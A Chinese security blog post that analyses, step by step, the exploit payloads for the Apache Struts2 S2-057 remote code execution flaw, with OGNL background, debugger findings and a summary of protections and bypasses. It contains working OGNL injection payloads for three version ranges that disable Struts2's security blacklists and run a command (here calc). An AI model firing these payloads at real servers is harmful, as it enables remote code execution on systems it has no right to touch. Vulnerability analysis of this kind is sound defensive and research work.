# Struts2 漏洞exp从零分析

阅读量 **251613**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-10-15 11:33:00

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p3.ssl.qhimg.com/t01ec0cc2ec0056328c.png)

## 0x00 前言

从零开始分析struts2代码执行exp，其中不但包括了struts2自己设置的防护机制绕过，还有ognl防护绕过。以s2-057为列，因为有三个版本的exp，从易到难，比较全。文章中包含的前置内容也比较多。

## 0x01 前置知识OGNL

struts2命令执行是利用ognl表达式，所以必须了解ognl。

###  1、HelloWorld

OGNL有三大要素，分别是表达式、Context、根对象。

使用ognl表达式的时候，是使用`Object ognl.Ognl.getValue(String expression, Map context,
Object root)` api执行ognl表达式。  
参数说明：  
`expression` ognl表达式  
`context` 是一个实现了Map接口的对象  
`root` bean对象

来写一个helloworld，将上面抽象的东西实践一番。

    
    
    class People{
        public Integer age;
        public String realName;
    
        public void setAge(Integer age) {
            this.age = age;
        }
    
        public void setRealName(String name) {
            this.realName = name;
        }
    
        public Integer getAge() {
            return this.age;
        }
    
        public String getRealName() {
            return this.realName;
        }
    }
    
    public class Temp {
    
        public static void main(String[] args) throws OgnlException {
            People root = new People();
            root.setAge(100);
            root.setRealName("lufei");
    
            OgnlContext context = new OgnlContext();
            context.put("nikename", "lufeirider");
    
            //注意非根对象属性，需要加上#号
            Object nikeName = Ognl.getValue("#nikename",context,root);
            System.out.println(nikeName);
    
            //使用跟对象属性时候，不需要加#号
            Object realName = Ognl.getValue("realName",context,root);
            System.out.println(realName);
    
            //@[类全名(包括包路径)@[方法名|值名]]
            //执行命令
            Object execResult = Ognl.getValue("@java.lang.Runtime@getRuntime().exec('calc')", context);
            System.out.println(execResult);
        }
    
    }
    

输出结果

    
    
    lufei
    lufeirider
    java.lang.ProcessImpl@1f17ae12
    

###  2、OgnlContext类

因为exp中常常利用赋值，改安全属性，而赋值操作在这个类中，所以好好看下这个类如何进行赋值与取值。（源码下载地址：[https://github.com/jkuhnert/ognl）](https://github.com/jkuhnert/ognl%EF%BC%89)  
`public class OgnlContext extends Object implements Map`，它是实现了Map接口的类。

看一下里面的主要方法和属性  
重写了`Map`的`put`方法，遇到`RESERVED_KEYS`里面的key，然后根据key进行使用不同方法进行赋值。如果不在`RESERVED_KEYS`里面的，则放入一个叫`_values`的Map里面。

    
    
    public Object put(Object key, Object value)
    {
        Object result;
    
        if (RESERVED_KEYS.containsKey(key)) {
            if (key.equals(OgnlContext.THIS_CONTEXT_KEY)) {
                result = getCurrentObject();
                setCurrentObject(value);
            } else {
                if (key.equals(OgnlContext.ROOT_CONTEXT_KEY)) {
                    result = getRoot();
                    setRoot(value);
                } else {
                    if (key.equals(OgnlContext.CONTEXT_CONTEXT_KEY)) {
                        throw new IllegalArgumentException("can't change " + OgnlContext.CONTEXT_CONTEXT_KEY
                                + " in context");
                    } else {
                        if (key.equals(OgnlContext.TRACE_EVALUATIONS_CONTEXT_KEY)) {
                            result = getTraceEvaluations() ? Boolean.TRUE : Boolean.FALSE;
                            setTraceEvaluations(OgnlOps.booleanValue(value));
                        } else {
                            if (key.equals(OgnlContext.LAST_EVALUATION_CONTEXT_KEY)) {
                                result = getLastEvaluation();
                                _lastEvaluation = (Evaluation) value;
                            } else {
                                if (key.equals(OgnlContext.KEEP_LAST_EVALUATION_CONTEXT_KEY)) {
                                    result = getKeepLastEvaluation() ? Boolean.TRUE : Boolean.FALSE;
                                    setKeepLastEvaluation(OgnlOps.booleanValue(value));
                                } else {
                                    if (key.equals(OgnlContext.CLASS_RESOLVER_CONTEXT_KEY)) {
                                        result = getClassResolver();
                                        setClassResolver((ClassResolver) value);
                                    } else {
                                        if (key.equals(OgnlContext.TYPE_CONVERTER_CONTEXT_KEY)) {
                                            result = getTypeConverter();
                                            setTypeConverter((TypeConverter) value);
                                        } else {
                                            if (key.equals(OgnlContext.MEMBER_ACCESS_CONTEXT_KEY)) {
                                                result = getMemberAccess();
                                                setMemberAccess((MemberAccess) value);
                                            } else {
                                                throw new IllegalArgumentException("unknown reserved key '" + key + "'");
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        } else {
            result = _values.put(key, value);
        }
    

还重写了`get`方法，跟上面的类似。`Ognl.getValue("#ct['root']",context,root);`，`context['root']`就能获取到保留属性比如获取到保留属性`root
temp.People[@7eda2dbb](https://github.com/7eda2dbb
"@7eda2dbb")`,而非在`_value`中获取。

来看下保留字符

    
    
    public static final String CONTEXT_CONTEXT_KEY = "context";
    public static final String ROOT_CONTEXT_KEY = "root";
    public static final String THIS_CONTEXT_KEY = "this";
    public static final String TRACE_EVALUATIONS_CONTEXT_KEY = "_traceEvaluations";
    public static final String LAST_EVALUATION_CONTEXT_KEY = "_lastEvaluation";
    public static final String KEEP_LAST_EVALUATION_CONTEXT_KEY = "_keepLastEvaluation";
    public static final String CLASS_RESOLVER_CONTEXT_KEY = "_classResolver";
    public static final String TYPE_CONVERTER_CONTEXT_KEY = "_typeConverter";
    public static final String MEMBER_ACCESS_CONTEXT_KEY = "_memberAccess";
    

其中`_memberAccess`是访问权限控制，比较重要。

设置访问权限

    
    
    public void setMemberAccess(MemberAccess value)
    {
        if (value == null) { throw new IllegalArgumentException("cannot set MemberAccess to null"); }
        _memberAccess = value;
    }
    

保留属性和`_values`一起组成如下图

![](https://p2.ssl.qhimg.com/t01341d41f573c82067.png)

###  3、单步调试ognl表达式

为了调试的方便，确认表达式哪步成功哪步不成功，所以要找能够观察每个表达式结果的地方。由于要再执行真正的表示之前要对参数进行调整、检测表达式。所以到真正执行之前调用之前有几层栈。

    
    
    ASTChain.getValueBody(OgnlContext, Object) line: 141    
    ASTChain(SimpleNode).evaluateGetValueBody(OgnlContext, Object) line: 212    
    ASTChain(SimpleNode).getValue(OgnlContext, Object) line: 258    
    Ognl.getValue(Object, Map, Object, Class) line: 494    
    Ognl.getValue(String, Map, Object, Class) line: 596    
    Ognl.getValue(String, Map, Object) line: 566    
    Temp.main(String[]) line: 48
    

真正调用是在`ASTChain.getValueBody`函数之中，里面有`for循环`是一个重要标识，通过遍历执行所有表达式。

![](https://p0.ssl.qhimg.com/t01f97f04e283ed051e.png)

###  4、 struts2环境下的OgnlContext

那么struts2框架会给OgnlContext设置哪些context和root?

![](https://p2.ssl.qhimg.com/t01722c53ec3033dc68.png)

这个HashMap中存在链表，如上图所示，所以想了解所有内容，需要点开HashMap中的next查看。  
`_root` 里面存储着着Struts2 ActionContext，值为Test，说明访问的是Test Action。  
`_value` 里面存储着session，parameters等ValueStack内容。

## 0x02 S2-057exp分析

以S2-057的exp为列进行分析，S2-057可以分成三个版本。

###  1、第一个最简单的版本

最简单的版本是以`struts-2.3.24`为列。  
打开如下url，选用弹出计算器的exp，比较容易观察是否执行成功，是否跑飞了。  
`http://127.0.0.1:8070/Test/${(%23cmd=[@java](https://github.com/java
"@java").lang.Runtime[@getRuntime](https://github.com/getRuntime
"@getRuntime")().exec("calc"))}/test`

下面的表达式与开始的helloworld不同的是，这里多了`${}`，因为  
`xwork-coresrcmainjavacomopensymphonyxwork2utilOgnlTextParser.java evaluate`,  
是以`$`或`%`作为限定符进行解析。

![](https://p1.ssl.qhimg.com/t01ab4ad2d27736b023.png)

我们期待的计算器并没有弹出。这时候`动态调试+开发者模式`的好处显示出来了，在console打印了

    
    
    十月 09, 2018 9:29:36 下午 com.opensymphony.xwork2.ognl.SecurityMemberAccess warn
    警告: Target class [class java.lang.Runtime] is excluded!
    

对`SecurityMemberAccess`类中弹出警告信息地方进行下断点，看到上一层`isMethodAccessible`会根据`context`的`_memberAccess`对象，调用相应对象的`isAccessible`方法，可以看到这里调用的是`com.opensymphony.xwork2.ognl.SecurityMemberAccess`类的`isAccessible`方法。

![](https://p3.ssl.qhimg.com/t010557a603bd9edb78.png)

可以将`_memberAccess`中的`com.opensymphony.xwork2.ognl.SecurityMemberAccess`对象覆盖成`ognl.DefaultMemberAccess`，因为`xwork2`自身对`ognl`的安全访问类的一些方法进行了重写，实现了自己的权限控制防护。但是`ognl`从helloworld看到是可以执行命令，没有防护。

![](https://p5.ssl.qhimg.com/t01f59b8e18d9f6aa4c.png)

在S2-057中，struts-2.3.24的exp如下。  
`http://127.0.0.1:8070/Test/%25{(%23_memberAccess=[@ognl](https://github.com/ognl
"@ognl").OgnlContext[@DEFAULT_MEMBER_ACCESS](https://github.com/DEFAULT_MEMBER_ACCESS
"@DEFAULT_MEMBER_ACCESS")).(%23cmd=[@java](https://github.com/java
"@java").lang.Runtime[@getRuntime](https://github.com/getRuntime
"@getRuntime")().exec("calc"))}/test`

经过测试`2.3.20~2.3.29`都是可以用

###  2、第二个版本

范围是：2.3.30~2.5.10，以`struts-2.3.30`为列。  
执行上面的exp还是会报`class [class java.lang.Runtime] is
excluded!`，和之前的结果`对比`一下，通过下面的截图可以看到`_memberAccess`还是`com.opensymphony.xwork2.ognl.SecurityMemberAccess`，不过在`_value`中增加了`_memberAccess=ognl.DefaultMemberAccess[@5d6edd4f](https://github.com/5d6edd4f
"@5d6edd4f")`。

![](https://p5.ssl.qhimg.com/t01e2c0de9adfa8f53e.png)

那我们单步跟踪一下（这里单步调试毕竟多，可以通过栈的刷新速度和右边的变量重新还原到上次跑飞的地方），这个覆盖为什么没有成功。通过单步跟踪发现，`ognl`并没有将`_memberAccess`纳入`RESERVED_KEYS`
Map中，导致被当成普通的属性进行赋值了。

![](https://p2.ssl.qhimg.com/t01ea00b9f6225b4258.png)

这里不能直接`#_memberAccess=[@ognl](https://github.com/ognl
"@ognl").OgnlContext[@DEFAULT_MEMBER_ACCESS](https://github.com/DEFAULT_MEMBER_ACCESS
"@DEFAULT_MEMBER_ACCESS")`进行对象覆盖，`OgnlValueStack`使用`OgnlUtil.createDefaultContext`进行创建`_memberAccess`默认属性，以及`OgnlUtil.excludedClasses、excludedPackageNamePatterns、excludedPackageNames`存储着黑名单，不过`com.opensymphony.xwork2.ognl.OgnlUtil.getExcludedxxxxx()`能够获取到这些私有属性集合。

为了获取到`OgnlUtil`对象，使用了`com.opensymphony.xwork2.inject.ContainerImpl.getInstance`进行实例化。

![](https://p0.ssl.qhimg.com/t017febc9eda1afb3fb.png)

获取`OgnlUtil`对象后，然后clear方法将黑名单清除掉。如果直接调用`setMemberAccess`会检测包`ognl`在黑名单中。最终exp如下

    
    
    ${(%23dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(%23cr=%23context['com.opensymphony.xwork2.ActionContext.container']).(%23ou=%23cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(%23ou.getExcludedPackageNames().clear()).(%23ou.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)).(%23cmd=@java.lang.Runtime@getRuntime().exec("calc"))}
    

`struts-2.3.34`这个版本是一个异数，使用上面的exp无法弹出计算器。  
通过单步调试发现，`get`方法无法获取到保留属性`context`，因为在这个版本中，`ognl`移除了`context`属性，不在作为保留属性。所以导致无法获取到`context`。

![](https://p3.ssl.qhimg.com/t013c003b4218948496.png)

这样无法直接通过`#`获取到`context`，但是可以从`request['struts.valueStack']`获取到`com.opensymphony.xwork2.ognl.OgnlValueStack.context`。

    
    
    request={struts.valueStack=com.opensymphony.xwork2.ognl.OgnlValueStack@3923c6df, struts.actionMapping=ActionMapping{name='test', namespace='/${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cr=#context['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)).(#cmd=@java.lang.Runtime@getRuntime().exec("calc"))}', method='null', extension='null', params=null, result=null}, __cleanup_recursion_counter=1}
    

所以exp为

    
    
    ${(%23dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(%23ct=%23request['struts.valueStack'].context).(%23cr=%23ct['com.opensymphony.xwork2.ActionContext.container']).(%23ou=%23cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(%23ou.getExcludedPackageNames().clear()).(%23ou.getExcludedClasses().clear()).(%23ct.setMemberAccess(%23dm)).(%23cmd=@java.lang.Runtime@getRuntime().exec("calc"))}
    

###  第三个版本

第三个版本范围是`2.5.12~2.5.16`，以`struts-2.5.12`版本为列。2.5以上的版本是把xwork2合并到struts2-core-x-x-xx.jar中了，在配置漏洞的环境的时候要注意一点，需要修改/WEB-INF/web.xml。

    
    
    <filter-class>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter</filter-class>
    改成
    <filter-class>org.apache.struts2.dispatcher.filter.StrutsPrepareAndExecuteFilter</filter-class>
    

使用上一个版本的exp发现没有弹出计算器，爆出如下信息，通过notepad++搜索源码，发现是在`ognl/OgnlRuntime.java`，进行下断点。

    
    
    Two methods with same method signature but not providing classes assignable? "public abstract void java.util.Set.clear()" and "public void java.util.Collections$UnmodifiableCollection.clear()" please report!
    

先断点后跟下去，发现最后发现是调用了`clear`清除`Collections$UnmodifiableSet
ExcludedClasses`，导致`ExcludedClasses`这些黑名单并没有被清除掉。

![](https://p3.ssl.qhimg.com/t014d3cf6f59fe986b3.png)

但是`OgnlUtil.setExcludedClasses`函数是对`excludedClasses`重新赋给一个新集合，并不是修改，所以我们赋值一个包含关紧要的类的黑名集合，从而达到了绕过。

    
    
    public void setExcludedClasses(String commaDelimitedClasses) {
        Set<String> classNames = TextParseUtil.commaDelimitedStringToSet(commaDelimitedClasses);
        Set<Class<?>> classes = new HashSet<>();
    
        for (String className : classNames) {
            try {
                classes.add(Class.forName(className));
            } catch (ClassNotFoundException e) {
                throw new ConfigurationException("Cannot load excluded class: " + className, e);
            }
        }
    
        excludedClasses = Collections.unmodifiableSet(classes);
    }
    

所以最终exp如下

    
    
    ${(%23dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(%23ct=%23request['struts.valueStack'].context).(%23cr=%23ct['com.opensymphony.xwork2.ActionContext.container']).(%23ou=%23cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(%23ou.setExcludedClasses('java.lang.Shutdown')).(%23ou.setExcludedPackageNames('sun.reflect.')).(%23ct.setMemberAccess(%23dm)).(%23cmd=@java.lang.Runtime@getRuntime().exec("calc"))}
    

但是第一次执行上面的exp会报500错误，第二次就不会报错了。

![](https://p4.ssl.qhimg.com/t01e8c09f5016247c83.png)

![](https://p2.ssl.qhimg.com/t01d8bdbb2d0cd23c13.png)

`ognl.OgnlRuntime.callAppropriateMethod`中通过`getAppropriateMethod`获取到合适的函数，不为空并且通权限的验证，就使用下面的`invokeMethod`执行`ognl`表达式里面的函数。这里看到`excludedClasses`跟默认设置的一样，前面我们不是使用`setExcludedClasses`设置了一个无关紧要的黑名单了吗？原因是修改的并不是当前`context`，而是修改的是`request['struts.valueStack'].context`，并没有更新到当前`context`，所以需要再执行一遍，将修改后的跟新到当前`context`就好了。

先后执行下面两个exp，就会发现不会报错500。

    
    
    ${(%23dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(%23ct=%23request['struts.valueStack'].context).(%23cr=%23ct['com.opensymphony.xwork2.ActionContext.container']).(%23ou=%23cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(%23ou.setExcludedClasses('java.lang.Shutdown')).(%23ou.setExcludedPackageNames('sun.reflect.'))}
    
    ${(%23dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(%23ct=%23request['struts.valueStack'].context).(%23ct.setMemberAccess(%23dm)).(%23cmd=@java.lang.Runtime@getRuntime().exec("calc"))}
    

## 总结

总结一下防护手段：  
1、添加黑名单  
2、阉割掉一些属性  
3、将属性设置私有或者将集合变成不可修改

总结一下绕过手段：  
1、最开始覆盖绕过  
`%23_memberAccess['excludedClasses']=%23_memberAccess['acceptProperties']`  
2、对象维度的覆盖  
`#_memberAccess=[@ognl](https://github.com/ognl
"@ognl").OgnlContext[@DEFAULT_MEMBER_ACCESS](https://github.com/DEFAULT_MEMBER_ACCESS
"@DEFAULT_MEMBER_ACCESS")`  
3、阉割掉一些属性，找替代品（因为为了开发的方便，会有一些替代品的存在）  
`#ct=#request['struts.valueStack'].context`  
4、将属性设置私有或者将集合变成不可修改，找能够改变的方法  
`ou.setExcludedClasses('java.lang.Shutdown')`

## 参考

[OGNL 语言介绍与实践](https://www.ibm.com/developerworks/cn/opensource/os-cn-ognl/index.html "OGNL 语言介绍与实践")  
[Ognl表达式基本原理和使用方法](https://www.cnblogs.com/cenyu/p/6233942.html
"Ognl表达式基本原理和使用方法")  
[Struts2【OGNL、valueStack】就是这么简单](https://juejin.im/post/5aa536af51882555686860f5
"Struts2【OGNL、valueStack】就是这么简单")  
[深入struts2
（一）—-Xwork介绍](https://blog.csdn.net/sxb0841901116/article/details/27358697
"深入struts2 （一）---Xwork介绍")  
[OgnlContext源码分析](https://blog.csdn.net/q291611265/article/details/47302225
"OgnlContext源码分析")  
[Struts2漏洞分析与研究之Ognl机制探讨](https://blog.csdn.net/u011721501/article/details/41610157
"Struts2漏洞分析与研究之Ognl机制探讨")  
[【Struts2-代码执行漏洞分析系列】S2-057](https://xz.aliyun.com/t/2618
"【Struts2-代码执行漏洞分析系列】S2-057")

###  下载

<https://archive.apache.org/dist/struts/>

###  exp

<https://github.com/Fnzer0/S2-057-poc>  
<https://github.com/Ivan1ee/struts2-057-exp>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **lufei** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/161690](/post/id/161690)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [分析](/tag/分析)
  * [绕过](/tag/绕过)
  * [Ognl](/tag/Ognl)
  * [Struts2](/tag/Struts2)

 **+1** __9赞

 __收藏

![](https://p0.ssl.qhimg.com/t014ad119e8dc01b8ad.jpg) lufei

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

